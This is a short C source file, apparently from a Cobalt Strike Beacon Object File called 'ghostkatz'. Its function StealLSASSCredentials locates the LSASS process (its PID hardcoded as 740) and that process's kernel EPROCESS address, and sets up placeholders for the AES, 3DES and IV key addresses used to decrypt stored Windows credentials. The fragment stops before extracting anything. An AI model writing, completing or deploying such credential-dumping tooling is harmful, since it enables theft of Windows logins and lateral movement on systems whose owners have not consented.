#include <windows.h>

#include "ghostkatz.h"
#include "defs.h"
#include "lsass.h"

BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Stealing LSASS Credentials!");

    
    DWORD LsassPID = 740; //GetTargetProcessInformation(L"lsass.exe");
    if (LsassPID == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid LSASS PID! Returning...");
        return FALSE;
    }

    // // Get LSASS EPROCESS address
    DWORD64 ntEprocessVA = GetNtEprocessAddress(hFile);
    DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA);
    if (LsassEprocessVA == 0)
       return FALSE;

        
    DWORD lower32bits = (DWORD)LsassEprocessVA;
    

    // Retrieve & Display Credential Data
    BeaconPrintf(CALLBACK_OUTPUT, "\n===== [ Credential Data ] =====");

    DWORD64 hAesKeyAddress = 0;
    DWORD64 h3DesKeyAddress = 0;
    DWORD64 IVAddress = 0;

    return TRUE;
}